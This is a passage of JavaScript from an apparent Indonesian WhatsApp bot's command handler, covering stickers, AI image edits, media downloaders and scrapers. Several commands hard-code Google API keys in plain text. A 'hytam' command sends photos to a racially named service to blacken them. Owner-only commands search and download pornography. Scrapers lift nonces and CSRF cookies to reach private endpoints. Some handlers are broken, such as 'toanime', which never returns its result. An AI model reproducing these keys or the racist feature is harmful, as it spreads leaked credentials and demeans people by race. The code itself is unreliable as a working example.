          if (!text) return reply(example("namamu dengan kirim media atau reply sticker"))
          
          const q = m.quoted || m
          const mime = q.mtype || ""
    
          if (!/image|video|sticker/gi.test(mime)) return reply(example("reply stiker/gambar/video"))
          if (/video/gi.test(mime) && q.seconds > 15) return reply("Durasi video maksimal 15 detik!")
    
          let mediaPath = await sock.downloadAndSaveMediaMessage(q)
    
          // Jika reply ke sticker (webp), konversi dulu ke buffer
          let stickerBuffer
          if (/webp/.test(mime)) {
            const webp = fs.readFileSync(mediaPath)
            stickerBuffer = await Sharp(webp).resize(512, 512).webp().toBuffer()
            fs.unlinkSync(mediaPath)
          } else {
            stickerBuffer = fs.readFileSync(mediaPath)
          }
    
          // Tambahkan Exif
          const stickerWithExif = await addExif(stickerBuffer, text, 'Itss Dric' || "")
    
          await sock.sendMessage(m.chat, { sticker: stickerWithExif }, { quoted: m })
          if (fs.existsSync(mediaPath)) fs.unlinkSync(mediaPath)
        }
        break
        //END
        //════════════════════════════════//
        //QC CASE
        case 'qc': {
        if (!text) return reply("Mana Teksnya?")
    
        let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
        let reswarna = warna[Math.floor(Math.random() * warna.length)]
    
        await sock.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
    
        const json = {
            "type": "quote",
            "format": "png",
            "backgroundColor": reswarna,
            "width": 512,
            "height": 768,
            "scale": 2,
            "messages": [
                {
                    "entities": [],
                    "avatar": true,
                    "from": {
                        "id": 1,
                        "name": m.pushName,
                        "photo": {
                            "url": ppuser
                        }
                    },
                    "text": text,
                    "replyMessage": {}
                }
            ]
        };
    
        // fungsi untuk generate ID acak
        const makeid = (length = 8) => {
            let result = '';
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            const charactersLength = characters.length;
            for (let i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * charactersLength));
            }
            return result;
        }
    
        const tempnya = makeid() + ".png";
    
        try {
            const res = await axios.post('https://bot.lyo.su/quote/generate', json, {
                headers: { 'Content-Type': 'application/json' }
            });
            const buffer = Buffer.from(res.data.result.image, 'base64');
            await fs.writeFile(tempnya, buffer, async (err) => {
                if (err) return reply("Error saat menyimpan gambar.")
                await sock.sendImageAsSticker(m.chat, tempnya, m, { packname: '내천사', author: 'Itss Dric' });
                fs.unlinkSync(`./${tempnya}`);
            });
        } catch (e) {
            reply("Gagal membuat quote.");
        }
        }
        break;
        //END
        //═════════════════════════════════// 
        case "toanime": {
            if (!/image/.test(mime))
              return await reply("Gunakan command tersebut di caption foto");
      
            let defaultPrompt = `Create a 1/7 scale commercialized figurine of the character or subject in the picture. 
The figurine must accurately match the input style:
- If the input is anime, keep anime-style face, jawline, and mouth.
- If the input is a real human, keep realistic jawline, mouth, and facial features.
- If the input is a vehicle, produce a realistic scaled-down model with accurate proportions.
Enhance slightly for symmetry and polish, but keep the original identity and design intact.
  
The figurine should look like premium painted PVC/ABS with smooth shading, sharp detailing, and professional finish. 
It is displayed on a modern computer desk, standing on a round transparent acrylic base with no text.
  
On the desk, the computer monitor displays the exact same figurine shown on the desk, but in ZBrush sculpt form: full body, gray clay shader, with visible sculpting strokes and subdivisions. 
Next to the monitor, place a Bandai-style toy packaging box printed with the original 2D artwork, glossy and professional, with a window display.
  
Lighting: soft studio light to emphasize the realism of the figurine. 
Facial features (jawline, mouth, eyes) or vehicle structure must be sharp, proportional, and true to the input. 
The environment should feel like a real hobbyist’s desk with subtle details like keyboard, mouse, and cables.`;
  
            let promptText = defaultPrompt;
      
            try {
                let imgData = await downloadToBuffer(media);
                let genAI = new GoogleGenerativeAI(
                  "AIzaSyCV-KWGIfvvOaCcBEmQyfTVX7RBUVfmRY8"
                );
        
                const base64Image = imgData.toString("base64");
        
                const contents = [
                  { text: promptText },
                  {
                    inlineData: {
                      mimeType: mime,
                      data: base64Image,
                    },
                  },
                ];
        
                const model = genAI.getGenerativeModel({
                  model: "gemini-2.0-flash-exp-image-generation",
                  generationConfig: {
                    responseModalities: ["Text", "Image"],
                  },
                });
        
                const response = await model.generateContent(contents);
        
                let resultImage;
                let resultText = "";
        
                for (const part of response.response.candidates[0].content.parts) {
                    if (part.text) {
                      resultText += part.text;
                    } else if (part.inlineData) {
                      const imageData = part.inlineData.data;
                      resultImage = Buffer.from(imageData, "base64");
                    }
                }
        
                sock.downloadAndSaveMediaMessage(resultImage);
            } catch (e) {
              await reply(e);
            }
        }
        break;
        //═════════════════════════════════//
        case "tofigure": {
            let q = m.quoted ? m.quoted : m;
            let mime = (q.msg || q).mimetype || q.mediaType || '';
        
            if (!/image\/(jpeg|jpg|png)/i.test(mime)) {
                return m.reply(`⚠ Reply ke *foto saja* dengan command *${prefix + command}*`);
            }
        
            await reaction(m.chat, "♠️");
        
            try {
                const allEndpoints = {
                    '1': {
                        url: 'https://api-faa.my.id/faa/tofigura?url=',
                        name: 'Figura Style V1'
                    },
                    '2': {
                        url: 'https://api-faa.my.id/faa/tofigurav2?url=',
                        name: 'Figura Style V2'
                    },
                    '3': {
                        url: 'https://api-faa.my.id/faa/tofigurav3?url=',
                        name: 'Figura Style V3'
                    }
                };
        
                let version = text?.trim() || '1';
                if (!allEndpoints[version]) version = '1';
        
                const media = await q.download();
                if (!media) throw new Error("Gagal download");
        
                const temp = "./temp_upload.jpg";
                fs.writeFileSync(temp, media);
        
                const catboxUrl = await uploadCatbox(temp);
        
                const apiUrl = allEndpoints[version].url + encodeURIComponent(catboxUrl);
        
                const result = await axios.get(apiUrl, {
                    responseType: "arraybuffer",
                });
        
                await sock.sendMessage(
                    m.chat,
                    {
                        image: result.data,
                        mimetype: "image/jpeg",
                        caption: `Hasil ${allEndpoints[version].name}`
                    },
                    { quoted: m }
                );
        
                fs.unlinkSync(temp);
                await reaction(m.chat, "✅");
        
            } catch (err) {
                console.error(err);
                await reaction(m.chat, "❌");
                m.reply("Terjadi error saat memproses gambar");
            }
        }
        break;
        //═══════════════════════════════════//
        case "edit-ai": {
        if (!text) return reply(`Promt nya mana?`);
          let q = m.quoted ? m.quoted : m;
          let mime = (q.msg || q).mimetype || "";
          
          let defaultPrompt = `${text}`;
          
          if (!mime) return reply(`Kirim/reply gambar dengan caption *${prefix + command}*`);
          if (!/image\/(jpe?g|png)/.test(mime)) return reply(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png`);
          
          let promptText = text || defaultPrompt;
          
          reply("Tunggu Sebentar...");
          
          try {
            let imgData = await q.download();
            let genAI = new GoogleGenerativeAI("AIzaSyDE7R-5gnjgeqYGSMGiZVjA5VkSrQvile8");
            
            const base64Image = imgData.toString("base64");
            
            const contents = [
              { text: promptText },
              {
                inlineData: {
                  mimeType: mime,
                  data: base64Image
                }
              }
            ];
            
            const model = genAI.getGenerativeModel({
              model: "gemini-2.0-flash-exp-image-generation",
              generationConfig: {
                responseModalities: ["Text", "Image"]
              },
            });
            
            const response = await model.generateContent(contents);
            
            let resultImage;
            let resultText = "";
            
            for (const part of response.response.candidates[0].content.parts) {
              if (part.text) {
                resultText += part.text;
              } else if (part.inlineData) {
                const imageData = part.inlineData.data;
                resultImage = Buffer.from(imageData, "base64");
              }
            }
            
            if (resultImage) {
              const tempPath = path.join(process.cwd(), "lib", `gemini_${Date.now()}.png`);
              fs.writeFileSync(tempPath, resultImage);
              
              await sock.sendMessage(m.chat, { 
                image: { url: tempPath },
                caption: `*Maaf jika tidak sesuai*`
              }, { quoted: m });
              
              setTimeout(() => {
                try {
                  fs.unlinkSync(tempPath);
                } catch {}
              }, 30000);
            } else {
              m.reply("Gagal di edit.");
            }
          } catch (error) {
            console.error(error);
            m.reply(`Error: ${error.message}`);
          }
        }
        break
        //═══════════════════════════════════//
        //OCR CASE
        case 'ocr': {
            let q = m.quoted ? m.quoted : m;
            let mime = (q.msg || q).mimetype || "";
            if (!mime) return reply("Send / Reply Image");
            if (!/image\/(jpe?g|png)/.test(mime))
              return reply(`Tipe ${mime} tidak didukung!`);
            let image = await q.download();
            let download = await sock.getFile(image, true);
            let ocr = await ocrSpace(download.filename);
            await sock.sendMessage(m.chat, { 
                text: ocr.ParsedResults[0].ParsedText.trim() 
            }, { quoted: contactQ });
        }
        break
        //END
        //═══════════════════════════════════//
        case 'tohijab': {
          if (!m.quoted) return reply(`Kirim atau Reply Foto dengan caption *${prefix + command}*`);
          let mime = (m.quoted.msg || m.quoted).mimetype || '';
          if (!/image/.test(mime)) return reply(`Kirim atau Reply Foto dengan caption *${prefix + command}*`);
          await reaction(m.chat, "♠️")
        
          const tempFile = path.join(__dirname, `temp_${Date.now()}.jpg`);
        
          try {
            let media = await m.quoted.download();
            fs.writeFileSync(tempFile, media);
        
            const uploadUguu = async (filePath) => {
              return new Promise((resolve, reject) => {
                exec(`curl -s -F files[]=@${filePath} https://uguu.se/upload.php`, (err, stdout) => {
                  if (err) return reject('Gagal mengunggah ke Uguu.');
                  try {
                    let json = JSON.parse(stdout);
                    resolve(json.files[0].url);
                  } catch {
                    reject('Gagal mengunggah ke Uguu.');
                  }
                });
              });
            };
        
            let uploadedUrl = await uploadUguu(tempFile);
            let apiUrl = `https://api.nekorinn.my.id/tools/to-hijab?imageUrl=${encodeURIComponent(uploadedUrl)}`;
        
            await sock.sendMessage(m.chat, {
              image: { url: apiUrl },
              caption: 'Berikut hasil foto berhijab-mu!'
            }, { quoted: m });
        
            fs.unlinkSync(tempFile);
          } catch (e) {
            console.error(e);
            reply('❌ Terjadi kesalahan saat memproses gambar.');
          }
        }
        break;
        //═══════════════════════════════════//
        case 'toanime-v2':
        case 'toreal': {
          try {
            if (!/image/.test(mime)) {
              return reply(`Kirim/kutip gambar dengan caption ${command}`)
            }
            await sock.sendMessage(m.chat, {react: {text: '♠️', key: m.key}})
            
            const style = command === 'toanime' ? 'AnimageModel' : 'RealisticModel'
            const media = await sock.downloadAndSaveMediaMessage(quoted)
            const imageUrl = await CatBox(media)
        
            const apiUrl = `https://fastrestapis.fasturl.cloud/imgedit/aiimage?prompt=Anime&reffImage=${encodeURIComponent(imageUrl)}&style=${style}&width=1024&height=1024&creativity=0.5`
            
            await sock.sendMessage(m.chat, { image: { url: apiUrl } }, { quoted: m })
          } catch (err) {
            console.error('Terjadi kesalahan:', err)
            m.reply('Terjadi kesalahan')
          } finally {
            if (media) {
              fs.promises.unlink(media).catch(() => {})
            }
          }
        }
        break
        //═══════════════════════════════════//
        case "botakin": case 'botak': {
          let q = m.quoted ? m.quoted : m;
          let mime = (q.msg || q).mimetype || "";
          
          let defaultPrompt = `hilangkan rambut di kepalanya`;
          
          if (!mime) return reply(`Kirim/reply gambar dengan caption *${prefix + command}*`);
          if (!/image\/(jpe?g|png)/.test(mime)) return reply(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png`);
          
          let promptText = text || defaultPrompt;
          
          reply("Tunggu Sebentar...");
          
          try {
            let imgData = await q.download();
            let genAI = new GoogleGenerativeAI("AIzaSyDE7R-5gnjgeqYGSMGiZVjA5VkSrQvile8");
            
            const base64Image = imgData.toString("base64");
            
            const contents = [
              { text: promptText },
              {
                inlineData: {
                  mimeType: mime,
                  data: base64Image
                }
              }
            ];
            
            const model = genAI.getGenerativeModel({
              model: "gemini-2.0-flash-exp-image-generation",
              generationConfig: {
                responseModalities: ["Text", "Image"]
              },
            });
            
            const response = await model.generateContent(contents);
            
            let resultImage;
            let resultText = "";
            
            for (const part of response.response.candidates[0].content.parts) {
              if (part.text) {
                resultText += part.text;
              } else if (part.inlineData) {
                const imageData = part.inlineData.data;
                resultImage = Buffer.from(imageData, "base64");
              }
            }
            
            if (resultImage) {
              const tempPath = path.join(process.cwd(), "lib", `gemini_${Date.now()}.png`);
              fs.writeFileSync(tempPath, resultImage);
              
              await sock.sendMessage(m.chat, { 
                image: { url: tempPath },
                caption: `*Maaf jika tidak sesuai*`
              }, { quoted: m });
              
              setTimeout(() => {
                try {
                  fs.unlinkSync(tempPath);
                } catch {}
              }, 30000);
            } else {
              m.reply("Gagal di edit.");
            }
          } catch (error) {
            console.error(error);
            m.reply(`Error: ${error.message}`);
          }
        }
        break
        //══════════════════════════════════//  
        //BRAT CASE
        case 'brat2': {
        if (!text) return reply(`Send command with text. ${prefix + command} Itss Dric Ganteng`)
        await sock.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
        const imageUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}`
        await makeStickerFromUrl(imageUrl, sock, m)
        }
        break
        //═══════════════════════════════════//
        case 'brat':
        case 'bratfoto': {
            if (!text) return reply('Mana Text Nya')
            var image = `https://api.siputzx.my.id/api/m/brat?text=${text}&isAnimated=false&delay=500`
            await sock.sendImageAsSticker(m.chat, image, m, {packname: 'Itss Dric'})
            await sleep(1000)
            sock.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
        }
        break
        //═══════════════════════════════════//   
        case 'bratvid': case 'bratvideo': {
    				
    				if (!text && (!m.quoted || !m.quoted.text)) return reply(`Kirim/reply pesan *${prefix + command}* Teksnya`)
    				const teks = (m.quoted ? m.quoted.text : text).split(' ');
    				const tempDir = path.join(process.cwd(), 'database/sampah');
    				try {
      					const framePaths = [];
      					for (let i = 0; i < teks.length; i++) {
        						const currentText = teks.slice(0, i + 1).join(' ');
        						let res = await getBuffer('https://aqul-brat.hf.space/?text=' + encodeURIComponent(currentText));
        						const framePath = path.join(tempDir, `${m.sender + i}.mp4`);
        						fs.writeFileSync(framePath, res);
        						framePaths.push(framePath);
      					}
      					const fileListPath = path.join(tempDir, `${m.sender}.txt`);
      					let fileListContent = '';
      					for (let i = 0; i < framePaths.length; i++) {
        						fileListContent += `file '${framePaths[i]}'\n`;
        						fileListContent += `duration 0.5\n`;
      					}
      					fileListContent += `file '${framePaths[framePaths.length - 1]}'\n`;
      					fileListContent += `duration 3\n`;
      					fs.writeFileSync(fileListPath, fileListContent);
      					const outputVideoPath = path.join(tempDir, `${m.sender}-output.mp4`);
      					execSync(`ffmpeg -y -f concat -safe 0 -i ${fileListPath} -vf 'fps=30' -c:v libx264 -preset veryfast -pix_fmt yuv420p -t 00:00:10 ${outputVideoPath}`);
      					sock.sendAsSticker(m.chat, outputVideoPath, m, { packname, author })
      					framePaths.forEach((filePath) => fs.unlinkSync(filePath));
      					fs.unlinkSync(fileListPath);
      					fs.unlinkSync(outputVideoPath);
    				} catch (e) {
    					m.reply('Terjadi Kesalahan Saat Memproses Permintaan!')
    				}
  			}
  			break
        //═══════════════════════════════════//
        case "hd":
        case "tohd": {
            if (!q) return reply("Reply / kirim media!")
        
            const mime = qmsg.mimetype || ""
        
            // ================= IMAGE (TETAP) =================
            if (/image/.test(mime)) {
      					try {
      					  const remini = require('../engine/remini')
      						let media = await quoted.download()
      						let hasil = await remini(media, 'enhance')
      						reply({ image: hasil, caption: 'Done' })
      					} catch (e) {
        						let media = await sock.downloadAndSaveMediaMessage(qmsg)
        						let ran = `./lib/Database/sampah/${getRandom('.jpg')}`;
        						const scaleFactor = isNaN(parseInt(text)) ? 4 : parseInt(text) < 10 ? parseInt(text) : 4;
        						exec(`ffmpeg -i "${media}" -vf "scale=iw*${scaleFactor}:ih*${scaleFactor}:flags=lanczos" -q:v 1 "${ran}"`, async (err, stderr, stdout) => {
        							fs.unlinkSync(media)
        							if (err) return m.reply(String(err))
        							let buff = fs.readFileSync(ran)
        							await sock.sendMedia(
                        m.chat,
                        buff,
                        '✅ Berhasil di-HD-kan!',
                        m,        // quoted HARUS di sini
                        {}
                      );
        							fs.unlinkSync(ran)
        						});
      					}
    			  }
        
            // ================= VIDEO (FFMPEG) =================
            if (/video/.test(mime)) {
                try {
                    if (qmsg.seconds > 60)
                        return reply("❌ Max durasi video 1 menit!")
        
                    await sock.sendMessage(m.chat, { react: { text: '🎥', key: m.key } })
                    
                    const tmpDir = path.join(__dirname, "./tmp")
                    if (!fs.existsSync(tmpDir)) {
                        fs.mkdirSync(tmpDir, { recursive: true })
                    }
        
                    const input = path.join(__dirname, `./tmp/${Date.now()}_in.mp4`)
                    const output = path.join(__dirname, `./tmp/${Date.now()}_hd.mp4`)
        
                    let videoBuffer = await qmsg.download()
                    fs.writeFileSync(input, videoBuffer)
        
                    const ffmpegCmd = `
ffmpeg -y -i "${input}" \
-vf "scale=1280:720:flags=lanczos,unsharp=5:5:1.0:5:5:0.0" \
-c:v libx264 -preset slow -crf 18 \
-c:a copy \
"${output}"
        `
        
                    exec(ffmpegCmd, async (err) => {
                        if (err) {
                            console.error(err)
                            fs.unlinkSync(input)
                            return reply("❌ Gagal convert video ke HD!")
                        }
        
                        let hdVideo = fs.readFileSync(output)
        
                        await sock.sendMessage(m.chat, {
                            video: hdVideo,
                            caption: "✅ Video berhasil di-HD-kan!"
                        }, { quoted: m })
        
                        fs.unlinkSync(input)
                        fs.unlinkSync(output)
        
                        return reaction(m.chat, "✅")
                    })
                } catch (e) {
                    console.error(e)
                    return reply("❌ Error saat HD video!")
                }
            }
        
            return reaction(m.chat, "😏")
        }
        break
        //═══════════════════════════════════//
        case 'hdvid': case 'hdvideo': {
            try {
                let q = m.quoted ? m.quoted : m;
                const mime = (q?.msg || q?.mesaage || q?.msgs || q).mimetype
                if (!/video/.test(mime)) return m.reply("⚠️ Masukan Video Buat Di HD kan");
                m.reply("Wait... Ini mau di hdkan")
                const result = await videoenhancer(await await q.download())
                if (!result?.output_url) return m.reply("❌ Gomene Error Gada Result Soal Nya!")
                sock.sendMessage(m.chat, {
                    document: {
                        url: result?.output_url
                    },
                    caption: `⚠️Kalo Gabisa di putar VT nya download: ${result?.output_url}`,
                    mimetype: "video/mp4",
                    fileName: "video-hd.mp4"
                }, {
                    quoted: m
                })
            } catch (e) {
                m.reply(`❌ Error Reason: ${e}`)
            };
        };
        break
        //═══════════════════════════════════//
        case 'toimage':
        case 'toimg': {
            if (!m.quoted || m.quoted.mtype !== 'stickerMessage') return reply('reply stiker untuk convert ke gambar.')
      
            await sock.sendMessage(m.chat, { react: { text: '🖼️', key: m.key } })
      
            const buffer = await m.quoted.download()
      
            await sock.sendMessage(m.chat, {
                image: buffer,
                caption: 'Stiker berhasil diubah jadi gambar.'
            }, { quoted: m })
        }
        break
        //════════════════════════════════════//
        case "hytam": {
         if (!/image/.test(mime)) return m.reply("Reply gambar yang mau dihitamin dengan caption *hytam*");
        
         const mediaPath = await sock.downloadAndSaveMediaMessage(qmsg);
         const buffer = fs.readFileSync(mediaPath);
         const base64Image = buffer.toString("base64");
        
         try {
    
             const response = await axios({
             url: "https://negro.consulting/api/process-image",
             method: "POST",
             data: {
             filter: "hitam",
             imageData: "data:image/png;base64," + base64Image
             }
             });
            
             const resultBuffer = Buffer.from(response.data.processedImageUrl.replace("data:image/png;base64,", ""), "base64");
             await sock.sendMessage(m.chat, { image: resultBuffer, caption: `Selesai, pake filter *hitam*` }, { quoted: m });
            
             fs.unlinkSync(mediaPath);
         } catch (err) {
             console.log(err);
             reply("Gagal memproses gambar.");
         }
        }
        break
        //═══════════════════════════════════//
        case 'stickertotext': case 'stctotxt': case 's2t': {
        
        if (!m.quoted || m.quoted.mtype !== 'stickerMessage') return reply(`${noticenya} reply stiker untuk diubah jadi teks.`);
    
        await sock.sendMessage(m.chat, { react: { text: '📝', key: m.key } });
    
        try {
            const { data } = await axios.post('https://api.popcat.xyz/stickersearch', { image: await m.quoted.download() }, {
            headers: { 'Content-Type': 'multipart/form-data' }
            });
    
            reply(`📝 Teks dari stiker:\n\n${data?.text || 'Tidak ditemukan.'}`);
        } catch (err) {
            console.error('❌ Error:', err);
            reply('Gagal mengambil teks dari stiker.');
        }
        }
        break;
        //═════════════════════════════════════//
        case "removebg": case "nobg": {
            try {
                if (!m.quoted) return reply(`Reply gambar dengan command ${prefix + command}`)
                
                let mime = (m.quoted.msg || m.quoted).mimetype || ""
                if (!mime.startsWith("image")) return reply("Harus reply gambar!")
        
                await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } })
        
                // ambil media
                let media = await m.quoted.download()
                
                let uploaded = await UploadFileUgu(media)
        
                let api = "https://api.levvicode.cloud/tools/removebgv2?url=" + encodeURIComponent(uploaded.url)
                
                let res = await fetch(api)
                let json = await res.json()
        
                if (!json.status) throw json
        
                let buffer = Buffer.from(json.result.image, "base64")
        
                await sock.sendMessage(m.chat, {
                    image: buffer,
                    caption: "RemoveBG Selesai ✅"
                }, { quoted: m })
        
                await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } })
        
            } catch (err) {
                console.log(err)
                reply("Gagal remove background 😢")
            }
        }
        break
        //════════════════════════════════════//
        case 'tiktok':
        case 'tt': {
            await sock.sendMessage(m.chat, {react: {text: '🔎', key: m.key}});
            if (args.length == 0) return reply(`${noticenya} Contoh: ${prefix + command} Link Tiktoknya`)
            let res = await tiktok2(`${args[0]}`)
            sock.sendMessage(m.chat, {
                video: { url: res.no_watermark }, 
                fileName: `tiktok.mp4`, 
                mimetype: 'video/mp4', 
                caption: "Sukses donwload vt",
                contextInfo: {
                    isForwarded: true, 
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: global.idSaluran,
                        newsletterName: global.namaSaluran 
                    }, 
                    externalAdReply: {
                        title: `${global.dev} - Assistant`,
                        body: `📍 Paju-si, South Korea`,
                        thumbnailUrl: global.thumb,
                        sourceUrl: global.linkSaluran,
                        mediaType: 1,
                        renderLargerThumbnail: false,
                    },
                }
            }, 
            { quoted : m }).then(() => {
            sock.sendMessage(m.chat, { 
                audio: { url: res.music }, 
                fileName: `tiktok.mp3`, 
                mimetype: 'audio/mp4'
                },{ quoted : m })
            })
        }
        break
        // END
        //════════════════════════════════════//
        async function teraboxDownload(url) {
            const BASE_URL = "https://terabxdownloader.org";
            const AJAX_PATH = "/wp-admin/admin-ajax.php";
        
            const CREATED_BY = "Ditzzy";
            const NOTE = "Thank you for using this scrape, please keep the watermark";
        
            // ambil nonce
            const html = await axios.get(BASE_URL).then(r => r.data);
            const $ = cheerio.load(html);
        
            const script = $('#jquery-core-js-extra').html();
            if (!script) throw new Error("Nonce script not found");
        
            const nonceMatch = script.match(/"nonce"\s*:\s*"([^"]+)"/);
            if (!nonceMatch) throw new Error("Nonce not found");
        
            const nonce = nonceMatch[1];
        
            // pakai URLSearchParams (lebih stabil)
            const form = new URLSearchParams();
            form.append("action", "terabox_fetch");
            form.append("url", url);
            form.append("nonce", nonce);
        
            const res = await axios.post(
                BASE_URL + AJAX_PATH,
                form
            );
        
            const raw = res.data?.data || {};
        
            return {
                created_by: CREATED_BY,
                note: NOTE,
                results: {
                    folders: (raw["📁 Folders"] || []).map(v => ({
                        name: v["📂 Name"],
                        type: v["📋 Type"],
                        size: v["📏 Size"]
                    })),
                    files: (raw["📄 Files"] || []).map(v => ({
                        name: v["📂 Name"],
                        type: v["📋 Type"],
                        size: v["📏 Size"],
                        fullPath: v["📍 Full Path"],
                        downloadLink: v["🔽 Direct Download Link"]
                    })),
                    summary: raw["📊 Summary"] || {
                        "📁 Total Folders": 0,
                        "📄 Total Files": 0,
                        "🔢 Total Items": 0
                    },
                    shortlink: raw["🔗 ShortLink"] || ""
                }
            };
        }
        //═══════════════════════════════════//
        case 'teradl': case 'teraboxdl':
        case 'tera': case 'terabox': {
            if (!text) {
                return m.reply(`Contoh:\n${usedPrefix + command} https://1024terabox.com/s/xxxx`);
            }
        
            await reaction(m.chat, "⏳")
        
            try {
                const data = await teraboxDownload(text);
        
                const { folders, files, summary } = data.results;
        
                if (!files.length) {
                    return m.reply('❌ Tidak ada file ditemukan.');
                }
        
                let msg = `📁 *TERABOX DOWNLOADER*\n\n`;
                msg += `📊 *Summary*\n`;
                msg += `• Folder: ${summary["📁 Total Folders"]}\n`;
                msg += `• File: ${summary["📄 Total Files"]}\n`;
                msg += `• Total: ${summary["🔢 Total Items"]}\n\n`;
        
                if (folders.length) {
                    msg += `📂 *Folders*\n`;
                    folders.forEach((f, i) => {
                        msg += `${i + 1}. ${f.name} (${f.size})\n`;
                    });
                    msg += `\n`;
                }
        
                msg += `📄 *Files*\n`;
                files.forEach((f, i) => {
                    msg += `${i + 1}. ${f.name} (${f.size})\n`;
                });
        
                await sock.sendMessage(m.chat, { text: msg }, { quoted: m });
        
                const maxSend = 5;
                for (const file of files.slice(0, maxSend)) {
                    const name = file.name.toLowerCase();
        
                    if (/\.(mp4|mkv|avi|mov)$/.test(name)) {
                        await sock.sendMessage(m.chat, {
                            video: { url: file.downloadLink },
                            caption: `🎬 ${file.name}\n📏 ${file.size}`
                        }, { quoted: m });
        
                    } else if (/\.(jpg|jpeg|png|gif)$/.test(name)) {
                        await sock.sendMessage(m.chat, {
                            image: { url: file.downloadLink },
                            caption: `🖼️ ${file.name}\n📏 ${file.size}`
                        }, { quoted: m });
        
                    } else if (/\.(mp3|wav|aac|flac)$/.test(name)) {
                        await sock.sendMessage(m.chat, {
                            audio: { url: file.downloadLink },
                            mimetype: 'audio/mpeg'
                        }, { quoted: m });
        
                    } else {
                        await sock.sendMessage(m.chat, {
                            document: { url: file.downloadLink },
                            fileName: file.name,
                            mimetype: 'application/octet-stream'
                        }, { quoted: m });
                    }
        
                    await new Promise(r => setTimeout(r, 2000));
                }
        
                if (files.length > maxSend) {
                    m.reply(`⚠️ Hanya ${maxSend} file dikirim dari total ${files.length}.`);
                }
        
            } catch (err) {
                console.error(err);
                m.reply('🚨 Error: ' + err.message);
            }
        }
        break;
        //═══════════════════════════════════//
        case "xnxx": {
            if (!isOwner) return reply(msg.owner)
            if (!text) return reply(example('step sister'))
        
            await sock.sendMessage(m.chat, { react: { text: '🔎', key: m.key }})
        
            let ytsSearch = await fetchJson(
                `https://restapi-v2.simplebot.my.id/search/xnxx?q=${encodeURIComponent(text)}`
            )
        
            // AMBIL DATA DENGAN AMAN
            let anuan = Array.isArray(ytsSearch.result)
                ? ytsSearch.result
                : Array.isArray(ytsSearch.result?.data)
                ? ytsSearch.result.data
                : []
        
            if (!anuan.length) {
                return reply("❌ Hasil tidak ditemukan atau API error")
            }
        
            let teks = ""
            for (let res of anuan) {
                teks += `⬨ *Title :* ${res.title || '-'}
⬨ *Info :* ${res.info || '-'}
⬨ *Link :* ${res.link || '-'}\n\n`
            }
        
            await reply(teks)
        }
        break
        //══════════════════════════════════//
        case "xnxxdl": case 'xdl': {
          if (!isOwner) return reply(msg.owner)
          if (!text) return reply(example("linknya"))
          if (!text.startsWith('https://')) return reply("Link tautan tidak valid")
          await fetchJson(`https://restapi-v2.simplebot.my.id/download/xnxx?url=${text}`).then(async (res) => {
          if (!res.status) return reply("Error! Result Not Found")
          await sock.sendMessage(m.chat, {video: {url: res.result.files.hight || res.result.files.low}, mimetype: "video/mp4", caption: "_*Siapkan TISU yang Banyak yaa💦*_"}, {quoted: m})
          }).catch((e) => reply("Error"))
        }
        break
        //══════════════════════════════════//
        case "pinterest": case "pin": {
            if (m.mtype === 'reactionMessage') return
            if (!text) return m.reply(`*Contoh:* ${cmd} Anime`)
        
            const axios = require('axios')
            const https = require('https')
            const qs = require('qs')
            const { generateWAMessageFromContent, prepareWAMessageMedia } = require('@whiskeysockets/baileys')
        
            async function pinterestV1(query) {
                const agent = new https.Agent({ keepAlive: true })
                try {
                    const home = await axios.get('https://www.pinterest.com/', {
                        httpsAgent: agent,
                        headers: { 'User-Agent': 'Mozilla/5.0' }
                    })
        
                    const raw = home.headers['set-cookie'] || []
                    const cookies = raw.map(c => c.split(';')[0]).join('; ')
                    const csrf = (raw.find(c => c.startsWith('csrftoken=')) || '')
                        .split('=')[1]?.split(';')[0] || ''
        
                    const body = qs.stringify({
                        source_url: `/search/pins/?q=${encodeURIComponent(query)}`,
                        data: JSON.stringify({
                            options: {
                                query,
                                field_set_key: 'react_grid_pin',
                                is_prefetch: false,
                                page_size: 25
                            },
                            context: {}
                        })
                    })
        
                    const res = await axios.post(
                        'https://www.pinterest.com/resource/BaseSearchResource/get/',
                        body,
                        {
                            httpsAgent: agent,
                            headers: {
                                'User-Agent': 'Mozilla/5.0',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-CSRFToken': csrf,
                                'X-Requested-With': 'XMLHttpRequest',
                                'Cookie': cookies
                            }
                        }
                    )
        
                    return res.data.resource_response.data.results
                        .map(p => p.images?.orig?.url || p.images?.['736x']?.url)
                        .filter(v => typeof v === 'string')
        
                } catch (e) {
                    console.error(e)
                    return []
                }
            }
        
            await m.reply("📌 Mengumpulkan gambar Pinterest...")
        
            const images = await pinterestV1(text)
            if (!images.length) return m.reply("❌ Gambar tidak ditemukan")
        
            const media = images.slice(0, 5)
            const albumId = `${Date.now()}`
        
            for (let i = 0; i < media.length; i++) {
                const prepared = await prepareWAMessageMedia(
                    { image: { url: media[i] } },
                    { upload: sock.waUploadToServer }
                )
        
                const msg = generateWAMessageFromContent(m.chat, {
                    imageMessage: {
                        ...prepared.imageMessage,
                        mediaGroupId: albumId,
                        caption: i === 0
                            ? `📌 *Pinterest Album*\n🔎 Query: *${text}*\n📸 Total: ${media.length}`
                            : undefined
                    }
                }, { quoted: m })
        
                await sock.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
            }
        }
        break
        //══════════════════════════════════//
        case "facebook": case "fb": case "fbdl": {
            if (!text) return reply(example("linknya mana?"))
            if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
            await fetchJson(`https://restapi-v2.simplebot.my.id/download/facebook?url=${text}`).then(async (res) => {
            if (!res.status) return reply("Error! Result Not Found")
            return sock.sendMessage(m.chat, {video: {url: res.result.media.video_hd || res.result.media.video_sd}, mimetype: "video/mp4", caption: "*Facebook Downloader ✅*"}, {quoted: m})
            }).catch((e) => m.reply("Error"))
        }
        break
        //════════════════════════════════//
        case 'ig': case 'ig2': case 'igdl':
        case 'instagram': {
